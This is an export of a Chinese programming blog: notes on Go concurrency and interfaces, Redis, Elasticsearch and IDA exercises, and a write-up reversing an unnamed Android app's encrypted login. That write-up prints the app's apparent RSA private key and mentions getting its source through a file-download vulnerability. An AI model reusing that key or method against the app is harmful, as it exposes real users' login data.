[{"categories":["Golang"],"content":"管道 channel： 环形队列，先进先出，多个协程读一个容器 package main import ( \"fmt\" \"time\" ) func main() { ch := make(chan int, 1)//为0则无缓冲，但能正常写入读取 go func() { a := \u003c-ch fmt.Printf(\"读出成功%d\\n\", a) }() time.Sleep(time.Second * 1) go func() { ch \u003c- 1 fmt.Printf(\"写入成功%s\", \"1\") }() time.Sleep(time.Second * 1) } package main import ( \"fmt\" \"sync\" ) func main() { ch := make(chan int, 100) // 缓冲 channel，容量 100 wg := sync.WaitGroup{} wg.Add(2) go func() { defer wg.Done() for i := 0; i \u003c 10; i++ { ch \u003c- i } }() go func() { defer wg.Done() for i := 0; i \u003c 10; i++ { ch \u003c- i } }() wg2 := sync.WaitGroup{} wg2.Add(1) go func() { sum := 0 for { a, ok := \u003c-ch if !ok { //channel为空、被关闭、就为false break } else { sum += a } } fmt.Println(\"sum=\", sum) wg2.Done() }() wg.Wait() close(ch) wg2.Wait() } 用管道去阻塞 package main import ( \"fmt\" \"sync\" ) func main() { ch := make(chan int, 100) // 缓冲 channel，容量 100 wg := sync.WaitGroup{} wg.Add(2) go func() { defer wg.Done() for i := 0; i \u003c 10; i++ { ch \u003c- i } }() go func() { defer wg.Done() for i := 0; i \u003c 10; i++ { ch \u003c- i } }() c2 := make(chan struct{}, 0) go func() { sum := 0 for { a, ok := \u003c-ch if !ok { //channel为空、被关闭、就为false break } else { sum += a } } fmt.Println(\"sum=\", sum) c2 \u003c- struct{}{} }() wg.Wait() close(ch) \u003c-c2 } ","date":"2025-06-14","objectID":"/posts/go%E7%AE%A1%E9%81%93/:0:0","tags":["Golang"],"title":"go管道","uri":"/posts/go%E7%AE%A1%E9%81%93/"},{"categories":["Golang"],"content":"死锁是指多个并发执行单元（如 goroutine）互相等待对方释放资源，导致所有相关方都无法继续执行的状态。在 Go 中，死锁通常发生在 channel 操作或 锁（mutex） 的使用不当时，例如pv不当操作。 容量=0读写必须严格同步，适用于精确控制。 容量\u003e0允许临时存储数据，适用于解耦和流量控制。 发送方负责关闭 Channel，避免接收方死锁！ 根据生产者和消费者的速度差： 如果生产者快，消费者慢：增大容量避免阻塞。 如果消费者快，生产者慢：小容量即可。 不关闭 Channel 会怎样？ 无缓冲 Channel：通常不需要关闭（除非明确需要通知接收方）。 有缓冲 Channel：如果接收方用 for range 循环，必须关闭以避免死锁： ","date":"2025-06-14","objectID":"/posts/golang%E6%AD%BB%E9%94%81/:0:0","tags":["Golang"],"title":"go死锁","uri":"/posts/golang%E6%AD%BB%E9%94%81/"},{"categories":["Golang"],"content":" package main import ( \"fmt\" \"time\" ) func main() { go func() { fmt.Println(\"hello\") }() go func() { fmt.Println(\"world\") }() time.Sleep(time.Second * 2) //如果没有Sleep，主线程可能立即退出，goroutine来不及执行 } sync.Waitgroup用于等待一组 goroutine 完成的同步工具，特别适用于需要阻塞主 goroutine 直到所有子 goroutine 执行完毕的场景。 //完全等待并发结束 package main import ( \"fmt\" \"sync\" ) func main() { wg := sync.WaitGroup{} wg.Add(2) //2个任务 go func() { defer wg.Done() fmt.Println(\"hello\") }() go func() { defer wg.Done() fmt.Println(\"world\") }() wg.Wait() } //子协程隔离错误，不影响mian package main import ( \"fmt\" \"time\" ) func f1() { defer func() { recover() }() //关键隔离匿名函数 a, b := 10, 0 a = a / b } func main() { go f1() time.Sleep(time.Second * 1) fmt.Println(\"over\") } 安全性 锁机制 package main import ( \"fmt\" \"sync\" ) var ( n int32 lock = sync.Mutex{} ) func foo() { for i := 0; i \u003c 10000; i++ { lock.Lock() n++ lock.Unlock() } fmt.Printf(\"foo %d\\n\", n) } func main() { wg := sync.WaitGroup{} wg.Add(2) //2个任务 go func() { defer wg.Done() foo() }() go func() { defer wg.Done() foo() }() wg.Wait() } atomic package main import ( \"fmt\" \"sync\" \"sync/atomic\" ) var ( n int32 lock = sync.Mutex{} ) func foo() { for i := 0; i \u003c 10000; i++ { atomic.AddInt32(\u0026n, 1) } fmt.Printf(\"foo %d\\n\", n) } func main() { wg := sync.WaitGroup{} wg.Add(2) //2个任务 go func() { defer wg.Done() foo() }() go func() { defer wg.Done() foo() }() wg.Wait() } ","date":"2025-06-11","objectID":"/posts/go%E5%8D%8F%E7%A8%8B/:0:0","tags":["Golang"],"title":"go协程","uri":"/posts/go%E5%8D%8F%E7%A8%8B/"},{"categories":["数据库"],"content":"Elasticsearch学习记录 安装elasticsearch和kibana services: elasticsearch: image: docker.elastic.co/elasticsearch/elasticsearch:8.13.2 platform: linux/amd64 container_name: es environment: - discovery.type=single-node - xpack.security.enabled=false #关闭密码认证（只在测试环境下运行） ports: - \"9200:9200\" networks: - es-net kibana: #可视化工具 image: docker.elastic.co/kibana/kibana:8.13.2 platform: linux/amd64 container_name: kibana environment: - ELASTICSEARCH_HOSTS=http://elasticsearch:9200 ports: - \"5601:5601\" depends_on: - elasticsearch networks: - es-net networks: es-net: 启动: docker compose up -d 访问ES： http://localhost:9200/ 浏览器出现上图表示正常。 访问kibana： http://localhost:5601/ Kibana运行查询等命令 点击Dev Tools： 查询全部数据： GET index/_search { \"query\": { \"match_all\": {} } } 查询全部索引： GET /_cat/indices?v ","date":"2025-05-25","objectID":"/posts/elasticsearch%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/:0:0","tags":["数据库"],"title":"Elasticsearch学习记录","uri":"/posts/elasticsearch%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["逆向","加密与解密"],"content":"APP抓包捕获登陆参数 因为没有网页端，只能在手机抓包或流量转发到电脑，手机Root过所以直接用手机。 loginType=RPQQrpdg4Fes4KNvy3Y%2B%2BpOI0A%2FylWUapwSE2BvKtkzcEM8bR%2BGtScJG4ddJ8MKV%2BRHL%2BhpQG4yt%0ADq%2Ff%2FzY7P9eP%2B94EBELbYL89R7UXjw%2BRD5BPJxeoduW37iJKLV25CuDMcmHlu3Y6hYsT1NSEqXdV%0APjGDPz8mYx7e8fxB6yc%3D%0A username=aNIrmXtw8nx6tVE****** password=X3WBkR13dBwKYc9KTYS0qgxts9O6jxhzBB%2FEB2kbKQY8VyN5g8exakcZZ64k1wKBlMit3XORAAFB%0AqHIzRb9YJoR6gsX9C2hXPmKjJcIEYHZLQE%2BjO5wT9zHF%2FZ0oUqVbREA3PiT97JwXIsd3Y8wYCTk6%0Aeq2fE6vrMr4oB2uabcY%3D%0A deviceModel=bGUK%2F8im%2FzPxcVzR1lO7HxvVzxzNAnIrhwv87GqQwigL1fPVfaOBdnkYxRVkSce7UdcKFh7YLtis%0AnGzt98FD2aOxsQ3J%2FYifNAgMmaIIhA6I3vr4%2Fs2FU83NRqCghW0QRUNp28oJMvBgnUTexv4bYPmq%0AdLf7RZDF1mh0nncYVSY%3D%0A devType=YcDlQYgnt0f%2FNAlEbYOKQUl9TZJD0SeR15iMoKahSu7E3Oj2549jSPwRxR3l2f11DGM2lkVLTs%2Bn%0A43WTazF3WM5pJ9n3W65TW3mc1COHzvI92WkcOAhEgol3mMi6uhdaHmQahKAd708ETv5VZvIN63Fm%0AYjMoq07ABgXG7714gIw%3D%0A opertionSystem=JrVdi%2BqF1C4SsRKTDUGhhTq0ScdbynezoR2JDVXLTbaQ6cVNPl4o2z6hkhwuRjN270yM7FKucQWI%0AE2gbnvMOpqn42FIn2FIxnhW0vgUxYxRCli186XVNZ72h8eT6AlEH0KDF6dMcJ76L8VAdR5UmZMyV%0ArsVAA77uOefjy6rzKVM%3D%0A ipAddress=l6zP%2FQp5sam3BIemhFGSkS7tMDzoW4OcAM6Ws%2FKdYW9yTVWzYc%2BU%2BKwdhowy1tUOXnRceLMg3D6c%0AUYo4F%2BVdqxse7i7XYoUFn%2B10qFo%2BwgaQtFnjSgqOEu4B3VYALsapRyUioarab8ZiYnotaDvxW1%2FL%0A6wGwa%2BvaeJIqH0oiXDA%3D%0A devId=VdBEdtsRKLx70vdYe%2F1g****** Url解码获取原始结果 复制下来有%，一眼就是URL，先URL解码 import urllib.parse data = { \"ipAddress\": \"l6zP/Qp5sam3BIemhFGSkS7tMDzoW4OcAM6Ws/KdYW9yTVWzYc%2BU%2BKwdhowy1tUOXnRceLMg3D6cUYo4F%2BVdqxse7i7XYoUFn%2B10qFo%2BwgaQtFnjSgqOEu4B3VYALsapRyUioarab8ZiYnotaDvxW1/L6wGwa%2BvaeJIqH0oiXDA%3D\", } #解码打印 for key, value in data.items(): decoded = urllib.parse.unquote(value.replace(\"\\n\", \"\")) print(f\"{key} = {decoded}\\n\") 还原加解密 算法助手抓包获取加密参数 拿到密钥开始还原加解密，但是每次加密结果是不一样的，加密算法是RSA随机填充序列，我们只有解密可以验证密钥是否可用 解密代码 from Crypto.PublicKey import RSA from Crypto.Cipher import PKCS1_v1_5 from base64 import b64decode, b64encode # 你的私钥和公钥（Base64 格式） private_key_b64 = \"\"\" MIICdgIBADANBgkqhkiG9w0BAQEFAASCAmAwggJcAgEAAoGBALdWyfoa5KK9tzSaHVAUOMVUx2RvuVwB+wZ3Dpa5HTIzgYE/kwImvfTVVflpC5w4qamelHiaExJoIbQBVsr1UE2WCEVyKF+fe7i4w8a2q1fMpIk1mYuvOtLtd3R5xRwAYcCekSddeChShisCS2HApMENrIQjKBAGur6cxfneBJP1AgMBAAECgYAqmaP81Vri5ao4Msc04D4AvB5InB0538vwSKG/K+w4yfcBjUAfc9kXlqqPdXUZK6FgpFRjYYmk8UVDijwclLu/pmRWXqMozlgE2Xbx+r5psxcbzXBIzeNx46eLHB6huOkttBZgknB2iKjJT/lJZ+1bPlaTxYdpmYCM20tHZKMjgQJBAOsn0l0ckRcFt+NICDdNfj+Pd14L/9Enu9aeQ81KI7L6Qygv+I1EduwY4jtub0TZy3fiyeVDwRq5Hby08hLqInkCQQDHlyPip3y9CEYSJDN5gn2aP6dzsXwHSpIYPIf2fMErZaFqvrV9in1ERzDTMT+o70kKbTsUng1pC4p8RflWUv5dAkEAs9DVmYG4qMQko1V3guJtAalw+6dtTMB3cFvBOP/SYI/iPp7ADzYlQdCdXhjKWPm6DsiK3hd7WDXpuV0cJr6G8QJAU1FWm6FLQyYXCi+uhUTh5eg4oOUwX2LTxeZO46iEgvc0APmHjdaoID6PtTnT11O8a+vZQ+wOsREuSF51jYGryQJAdglyLFsbUSMN8jdh6E0HYgYbKU5n6wnSBmLK5F81brytIbJID7bA0K5hj4TOCzjcE7VDzTCHd20sofPnU4zhFA== \"\"\".replace(\"\\n\", \"\") public_key_b64 = \"\"\" MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC3Vsn6GuSivbc0mh1QFDjFVMdkb7lcAfsGdw6WuR0yM4GBP5MCJr301VX5aQucOKmpnpR4mhMSaCG0AVbK9VBNlghFcihfn3u4uMPGtqtXzKSJNZmLrzrS7Xd0ecUcAGHAnpEnXXgoUoYrAkthwKTBDayEIygQBrq+nMX53gST9QIDAQAB \"\"\".replace(\"\\n\", \"\") # 生成私钥和公钥对象 private_key = RSA.importKey(b64decode(private_key_b64)) public_key = RSA.importKey(b64decode(public_key_b64)) def encrypt_with_public_key(plain_text: str) -\u003e str: cipher = PKCS1_v1_5.new(public_key) encrypted = cipher.encrypt(plain_text.encode('utf-8')) return b64encode(encrypted).decode() def decrypt_with_private_key(cipher_text_b64: str) -\u003e str: cipher = PKCS1_v1_5.new(private_key) encrypted_bytes = b64decode(cipher_text_b64) sentinel = b\"error\" decrypted = cipher.decrypt(encrypted_bytes, sentinel) return decrypted.decode() plain = \"scan.work\" enc = encrypt_with_public_key(plain) dec = decrypt_with_private_key(enc) print(\"原文:\", plain) print(\"加密后:\", enc) print(\"解密后:\", dec) 之前这个站有任意文件下载漏洞，所以把打包的源码下载到本地过，我们查看一下反编译的Class 有私钥公钥且私钥与算法助手获取的一致，审计源码可知，都是公钥加密，私钥解密的。 加密代码 from Crypto.PublicKey import RSA from Crypto.Cipher import PKCS1_v1_5 from base64 import b64decode, b64encode # ","date":"2025-05-04","objectID":"/posts/%E5%AE%89%E5%8D%93%E6%9F%90app%E7%99%BB%E9%99%86%E9%80%86%E5%90%91/:0:0","tags":["逆向","加密与解密"],"title":"安卓某APP登陆逆向","uri":"/posts/%E5%AE%89%E5%8D%93%E6%9F%90app%E7%99%BB%E9%99%86%E9%80%86%E5%90%91/"},{"categories":["IDA","逆向"],"content":"IDA逆向作业练习 打开后搜索todo_0方法，找到后按Tab进入混淆汇编代码，美化前： 代码分析得知： strlen_chk方法有a1参数，所以他可能为输入参数，则赋予v2变量可能为字符串长度，v9可能为申请内存后的地址，大小为v2+1。 strcpy_chk可能为复制操作，将a1复制到v9，运行sub_208BC方法后，释放内存。 接着进入sub_208BC函数： __int64 __usercall sub_208BC@\u003cX0\u003e(__int64 a1@\u003cX0\u003e, unsigned __int64 a2@\u003cX1\u003e, __int64 a3@\u003cX8\u003e) { __int64 result; // x0 unsigned __int64 i; // [xsp+18h] [xbp-28h] //unsigned 无符号 result = sub_21BF4(); for ( i = 0LL; i \u003c a2; ++i ) { sub_23140(a3, (unsigned __int8)a0123456789abcd[(int)*(unsigned __int8 *)(a1 + i) \u003e\u003e 4]); //sub_23140方法将a1 + i的值右移四位 result = sub_23140(a3, (unsigned __int8)a0123456789abcd[*(_BYTE *)(a1 + i) \u0026 0xF]); } return result; } 美化后： void __usercall todo_0_1(char *input_str_2@\u003cX0\u003e, char *output_str@\u003cX8\u003e) { size_t input_str; // x0 char v3; // [xsp+14h] [xbp-7Ch] int j; // [xsp+2Ch] [xbp-64h] int i; // [xsp+30h] [xbp-60h] int random_num; // [xsp+34h] [xbp-5Ch] size_t input_len_1; // [xsp+38h] [xbp-58h] _BYTE *data; // [xsp+40h] [xbp-50h] input_str = __strlen_chk(input_str_2, 0xFFFFFFFFFFFFFFFFLL); data = operator new[](input_str + 1); input_len_1 = __strlen_chk(input_str_2, 0xFFFFFFFFFFFFFFFFLL); __strcpy_chk(data, input_str_2, -1LL); srand(input_len_1); random_num = rand() \u0026 0xF; for ( i = 0; i \u003c random_num; ++i ) { for ( j = 0; j \u003c input_len_1; ++j ) { v3 = data[j]; data[j] = v3 ^ rand(); } } enccode_hex(data, input_len_1, output_str); if ( data ) operator delete[](data); } 还原代码： from ctypes import c_int import binascii # Windows随机数生成器 windows_status = 1 def windows_srand(seed): global windows_status windows_status = seed def windows_rand(): global windows_status windows_status = (214013 * windows_status + 2531011) \u0026 0xffffffff return windows_status \u003e\u003e 16 \u0026 ((1 \u003c\u003c 15) - 1) # Android随机数生成器 android_seed = 0 android_multiplier = 0x5DEECE66D android_addend = 0xB android_mask = (1 \u003c\u003c 48) - 1 android_seedUniquifier = 8682522807148012 def android_srand(seed): global android_seed android_seed = _initialScramble(seed) def _initialScramble(seed): return (seed ^ android_multiplier) \u0026 android_mask def _next(bits): global android_seed oldseed = android_seed nextseed = (oldseed * android_multiplier + android_addend) \u0026 android_mask android_seed = nextseed return c_int(((nextseed \u003e\u003e (48 - bits)))).value def android_nextInt(): return _next(32) def android_nextInt_bound(bound): global android_seed r = _next(31) m = bound - 1 if bound \u0026 m == 0: r = (((bound * (r \u0026 0xffffffffffffffff)) \u003e\u003e 31) \u0026 0xffffffff) else: u = r r = u % bound while u - r + m \u003c 0: r = u % bound u = _next(31) return r # Linux随机数生成器 linux_status = 0 linux_r = [] def linux_srand(seed): global linux_status, linux_r if seed == 0: seed = 1 word = seed seed = seed \u0026 0xffffffff linux_status = 0 linux_r = [0] * (344 + linux_status) linux_r[0] = seed for i in range(1, 31): if word \u003c 31: hi = (-word) // 127773 hi = -hi lo = (-word) % 127773 lo = -lo else: hi = word // 127773 lo = word % 127773 word = ((16807 * lo)) - ((2836 * hi)) if word \u003c 0: word = (2147483647 + word) \u0026 0xffffffff linux_r[i] = word for i in range(31, 34): linux_r[i] = linux_r[i - 31] for i in range(34, 344): linux_r[i] = (((linux_r[i - 31] + linux_r[i - 3]) \u0026 0xffffffff) % (1 \u003c\u003c 32)) \u0026 0xffffffff def linux_rand(): global linux_status, linux_r linux_r.append(0) linux_r[344 + linux_status] = (((linux_r[344 + linux_status - 31] + linux_r[344 + linux_status - 3]) \u0026 0xffffffff) % (1 \u003c\u003c 32)) \u0026 0xffffffff linux_status += 1 return linux_r[344 + linux_status - 1] \u003e\u003e 1 # 加密函数 def todo_0(s): linux_srand(len(s)) enc_loop = linux_rand() \u0026 0xF s = bytearray(s) for _ in range(enc_loop): for i in range(len(s)): s[i] = s[i] ^ (linux_rand() \u0026 0xff) #0xff是限制结果 return s # 示例使用 input_bytes = b'1234' encrypted_bytes = todo_0(input_bytes) print(binascii.hexlify(encrypted_bytes)) ","date":"2024-11-18","objectID":"/posts/ida%E9%80%86%E5%90%91%E4%BD%9C%E4%B8%9A%E7%BB%83%E4%B9%A0/:0:0","tags":["IDA","逆向"],"title":"IDA逆向作业练习（todo_0）","uri":"/posts/ida%E9%80%86%E5%90%91%E4%BD%9C%E4%B8%9A%E7%BB%83%E4%B9%A0/"},{"categories":["Redis","数据库"],"content":"Redis主从复制、哨兵模式学习理解","date":"2024-07-12","objectID":"/posts/redis%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","tags":["Redis"],"title":"Redis进阶学习笔记","uri":"/posts/redis%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["Redis","数据库"],"content":"主从模式基本概念 1️⃣ 数据的复制是单向的，只能由主节点到从节点 2️⃣ 主从复制是Redis高可用的基础，还是哨兵和集群能够实施的基础 3️⃣ 主节点提供写服务，由从节点提供读服务（即写Redis数据时应用连接主节点，读Redis数据时应用连接从节点） 4️⃣ 在未开启哨兵模式下，如果从机断开重连，不会自动连接上主机 5️⃣ 从机只能读，不能写 基本步骤 配置文件复制 cp redis_1.conf redis_2.conf １．１修改从主机配置文件（redis2.conf） port 1234 pid name logfile dump.rdb １．２启动并且查看运行情况 redis-server conf文件 ps -ef|grep redis 命令参数 info replication #查看当前Redis信息 slaveof 127.0.0.1 6379 # 确定这个库为主机 slaveof no one #让自己变成主机，但是从机需要手动连接到此主机 哨兵模式基本概念 1️⃣ 哨兵是一个独立的 进程 ，作为进程，它会独立运行。其原理是哨兵通过发送命令，等待Redis服务器响应，从而监控运行的多个Redis实例。 2️⃣ 如果主机宕机，从机立刻选出一个主机，如果之前主机回来只能当从机，哨兵的默认配置时间时 30 秒。 基本步骤 添加哨兵配置文件 sentinel.conf 内容为： #服务监听地址，用于客户端连接，默认本机地址 bind 0.0.0.0 #是否已后台daemon方式启动 daemonize yes #安全保护模式 protected-mode no #哨兵端口 port 26380 #日志文件路径 logfile \"/myredis/sentinel26380.log\" #pid文件路径 pidfile /var/run/redis-sentinel26380.pid #工作目录 dir /myredis #设置要监控的master服务器，quorum表示最少有几个哨兵认可客观下线，同意故障迁移的法定票数 sentinel monitor mymaster 192.168.10.110 6379 2 #master设置了密码，连接master服务的密码 sentinel auth-pass mymaster 123456 启动哨兵 redis-sentinel sentinel.conf --sentinel \u0026 故障转移 ℹ️ 选主过程： 1️⃣ 选择优先级最高的节点，通过sentinel配置文件中的replica-priority配置项，这个参数越小，表示优先级越高 2️⃣ 如果第一步中的优先级相同，选择offset最大的，offset表示主节点向从节点同步数据的偏移量，越大表示同步的数据越多 3️⃣ 如果第二步offset也相同，选择run id较小的 ","date":"2024-07-12","objectID":"/posts/redis%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:0:0","tags":["Redis"],"title":"Redis进阶学习笔记","uri":"/posts/redis%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["Redis","数据库"],"content":"Redis 事务乐观锁学习理解","date":"2024-07-11","objectID":"/posts/redis%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/","tags":["Redis"],"title":"Redis基础学习笔记（二）","uri":"/posts/redis%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/"},{"categories":["Redis","数据库"],"content":"Redis-cli 交互命令参数 连接参数： -h \u003chostname\u003e 指定 Redis 服务器的主机名或 IP 地址。 -p \u003cport\u003e 指定 Redis 服务器的端口号。 -a \u003cpassword\u003e 提供密码进行身份验证。 -n \u003cdbnum\u003e 选择特定的数据库（默认为 0）。 SSL/TLS 参数： --tls 启用 SSL/TLS 加密连接。 --cacert \u003cfile\u003e 指定信任的 CA 证书文件。 --cert \u003cfile\u003e 和 --key \u003cfile\u003e 指定客户端证书和私钥。 输入和输出参数： -x 将标准输入视为命令的最后一个参数。 --raw 和 --no-raw 分别用于强制原始输出或人类可读输出。（中文） 其他特殊命令： PING 检查 Redis 服务器是否响应。 INFO 显示服务器的各种信息和统计数据。 事务 事务的特性 1️⃣ 原子性（atomicity）。一个事务是一个不可分割的工作单位，事务中包括的操作要么都做，要么都不做。 2️⃣ 一致性（consistency）。事务必须是使数据库从一个一致性状态变到另一个一致性状态。一致性与原子性是密切相关的。 3️⃣ 隔离性（isolation）。一个事务的执行不能被其他事务干扰。即一个事务内部的操作及使用的数据对并发的其他事务是隔离的，并发执行的各个事务之间不能互相干扰。 4️⃣ 持久性（durability）。持久性也称永久性（permanence），指一个事务一旦提交，它对数据库中数据的改变就应该是永久性的。接下来的其他操作或故障不应该对其有任何影响。 #️⃣在Redis事务没有没有隔离级别的概念！ #️⃣在Redis单条命令式保证原子性的，但是事务不保证原子性！ 实现事务 multi # 开启事务\rexec # 执行事务\rdiscard # 放弃事务\r### 编译时报错，所有都不会被执行（一开始就报错）\r### 运行时报错，其他命令正常执行乐观锁 乐观锁的特性 1️⃣ 当程序中可能出现并发的情况时，就需要保证在并发情况下数据的准确性，以此确保当前用户和其他用户一起操作时，所得到的结果和他单独操作时的结果是一样的。 2️⃣ 没有做好并发控制，就可能导致脏读、幻读和不可重复读等问题。 watch key #监视锁\runwatch key #取消监视","date":"2024-07-11","objectID":"/posts/redis%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/:0:0","tags":["Redis"],"title":"Redis基础学习笔记（二）","uri":"/posts/redis%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/"},{"categories":["Redis","数据库"],"content":"Redis 的八种数据结构","date":"2024-07-10","objectID":"/posts/redis%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/","tags":["Redis"],"title":"Redis基础学习笔记（一）","uri":"/posts/redis%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/"},{"categories":["Redis","数据库"],"content":"Redis 的八种数据结构 String 字符串 1️⃣ 支持二进制（可存储图片或序列化对象），单个最大512MB。 2️⃣ 一个Key对应一个Value，并且Set之后会覆盖之前所存储的值。 基本语法： set key value getrange key start end # 字符串值的子字符（单个字符） exists key # 判断存在返回1，不存在则返回0 append key value # 追加到value到原值之后 strlen key # 查看字符串长度 incr key 10 # 自增1 incrby key 10 自增10 decr key # 自减1 decrby key 10 自减10 setrange key start vakue # 在Start位置替换为value setnx key value #如果键存在，则不设置值 mset k1 v1 k2 v2 #设置多个键值 mget k1 k2 #获取多个值 msetnx k1 v1 k2 v2 #要么都成功设置，要么都失败 getset key value #如果已存在Key，先显示旧value再进行替换，如果没有则直接写入 mset a:1:name Scan # 效果如下图所示 键值过期： ttl key #查询过期时间 -1永不过期 -2已过期 expire key time #设置key的过期时间，前提是Key已存在 setex key time value #设置key的过期时间，可以同时设置键值 Hash对象 ℹ️ 是一个String类型的field和value的映射表，适合当对象 hset key field value # 设置单个属性 hmset key field value field value # 设置多个属性 hget hgetall #一个是查询单个 一个是查询所有 hdel key field #删除hash中指定的值 hlen key #获取长度 hexists key field #判断值是否存在 hvals #获取所有值 获取所有键 hkey #获取所有键 hincrby key field 值 #自增自减操作 填数字 hsetnx #存在则不添加 无序集合 ℹ️ 元素没有重复的，都是单个的 sadd key 元素 #可添加多个元素 scard key #查看元素长度（个数） smembers key #查看元素 srem key member #移除指定元素（可多个） srandmember key num #随机抽取num个元素，不填写个数默认抽取一个并且不显示序号 spop key #删除随机元素 smove key newkey value #启动value到newkey #交集 并集 差集 sdiff k1 k2 # 求差集： k1有的元素、k2中却没有的元素 sinter k1 k2 # 求交集： k1,k2都有的元素 sunion k1 k2 k3# 求并集(包括重复的)： k1 k2 k3 合起来的元素 有序集合 zadd key score value #添加值、score值 zrange key #查询值 zrangebyscore key -inf +inf #根据value的score值从小到大排列 zrevrabge key #根据value的score值从大到小排列 zrangebyscore key -inf +inf withscores #查询所有的值包括key zcard key #查询集合里的元素个数 zrem key 元素# 移除指定元素、可多个 zcount key min max #如果在min 或者 max 前添加 （ 则为闭区间 同一个元素可以有多个分数，每个分数对应一个不同的排序位置 列表 lpush key value #左插入数据（可以多个） rpush key value #右插入数据（可以多个） lpop #从最左边移除数据 rpop #从最右边移除数据 lrange key start end #end为-1时 查所有 lindex key 0 #查询指定下标元素 llen key #获取指定列表的元素长度 lrem key 数量 value #当数量为0时，删除所有value ltrim key start end #截取元素，下标从0开始 rpoplpush key newkey #移除key的最后一个元素，到newkey里 lset key 下标值 newvalue #更新/替换 下标所在的元素 为 newvalue linsert key after/before value newvalue # 在key的value之前或者之后 添加newvalue 地理位置 ℹ️ 有效的经度从-180度到180度，有效的纬度从-85.05112878度到85.05112878度 ℹ️ 本质上是有序集合数据类型，官方做了二次包装 geoadd 索引值 经度 纬度 地点 #geoadd city 经度 维度 \"漂亮国\" geopos city Beijing Shanghai #查看指定城市的经纬度信息，支持多个 geodis city Beijing Shanghai (可加单位 默认单位米) # 计算两点距离 georadius city 经度 纬度 距离 (可加单位 默认单位米) # 查询指定坐标范围的城市 可加参数：1.withcoord # 返回范围内城市的元素坐标 2.withdist #返回与中心店的距离 3.count #限制返回多少个城市数量 georadiusbymember city 地点 距离 (可加单位 默认单位米) #查询指定城市地点的范围地点城市 位图(Bitmap) ℹ️ 只有 0 和 1 两 个 状 态 setbit key offset 0/1 #设置值为0或1 getbit key offset #查询offset是否为1 bitcount key #默认查询多少个是1 在上下学、在线状态的场景下实用。 基数(数据集) ℹ️ 占用的内存是固定的，2^64个元素，相当于只需要12kb的内存即可。效率极高！ pfadd key element #添加数据集 pfcount key #统计数据集的元素个数 pfmegre k1 k2 #合并并且去重 ","date":"2024-07-10","objectID":"/posts/redis%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/:0:0","tags":["Redis"],"title":"Redis基础学习笔记（一）","uri":"/posts/redis%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/"},{"categories":["Golang"],"content":"Golang的接口是一种抽象的类型 Go语言中的接口（interface）是一组方法签名的集合，是一种抽象类型。接口定义了方法，但没有实现，而是由具体的类型（struct）实现这些方法，因此接口是一种实现多态的机制。 接口定义 type 接口名称er interface{ func(arg1 类型,arg2 类型2) 返回值 func(arg3 类型3) 返回值3 } //最好以er结尾表示 不加func也可以 结构体定义 type 结构体名称 struct{ Name 类型（string、int、bool等） } 典型Demo package main import ( \"fmt\" ) // Worker 接口定义了一个方法 Work type Worker interface { Work() } // programmer 结构体代表一个程序员,定义数据类型 type programmer struct { Java string Linux string Python string } // Work 实现了 Worker 接口的方法 func (p *programmer) Work() { // 输出程序员的类型和使用的编程语言 fmt.Printf(\"小李正在学习%s\\n\", p.Java) fmt.Printf(\"小张正在学习%s\\n\", p.Linux) fmt.Printf(\"小王正在学习%s\\n\", p.Python) } func main() { // 创建一个 programmer 实例，并初始化字段 myProgrammer := programmer{ Java: \"Java语言\", Linux: \"Linux运维\", Python: \"Python语言\", } var Myworker Worker = \u0026myProgrammer // 接口变量赋值也叫实现结构体 Myworker.Work() //调用接口方法 } 信息 以 上 代 码 作 为 基 础 进 行 拓 展 一个类型实现多个接口 package main import ( \"fmt\" \"time\" ) // Worker 接口定义了一个方法 Work type Worker interface { Work() } type Stoper interface { Stop() } // programmer 结构体代表一个程序员 type programmer struct { Java string Linux string Python string } // Work 实现了 Worker 接口的方法 func (p *programmer) Work() { //指针接收者可以修改字段值 // 输出程序员的类型和使用的编程语言 fmt.Printf(\"小李正在学习%s\\n\", p.Java) fmt.Printf(\"小张正在学习%s\\n\", p.Linux) fmt.Printf(\"小王正在学习%s\\n\", p.Python) } func (p programmer) Stop() { //值接收者不修改字段值 fmt.Printf(\"小李已经停止学习%s\\n\", p.Java) fmt.Printf(\"小张已经停止学习%s\\n\", p.Linux) fmt.Printf(\"小王已经停止学习%s\\n\", p.Python) } func main() { // 创建一个 programmer 实例，并初始化字段 myProgrammer := programmer{ Java: \"Java语言\", Linux: \"Linux运维\", Python: \"Python语言\", } x1 := programmer{} // 接口变量赋值也叫实现结构体 var Myworker Worker = \u0026myProgrammer // 接口变量赋值也叫实现结构体 Myworker.Work() //调用接口方法 time.Sleep(time.Second * 2) x1.Stop() } 多个类型实现一个接口 package main import ( \"fmt\" ) // Worker 接口定义了一个方法 Work type Worker interface { Work() } // programmer 结构体代表一个程序员 type programmer struct { Python string } type older struct { age int } func (p programmer) Work() { fmt.Printf(\"%s的程序员正在工作\", p.Python) fmt.Println(\"\") //换行 } func (o older) Work() { fmt.Printf(\"%d岁的程序员正在工作\", o.age) } func main() { // 创建一个 programmer 实例，并初始化字段 myProgrammer := programmer{ Python: \"Python\", } o := older{age: 20} var Myworker Worker = \u0026myProgrammer // 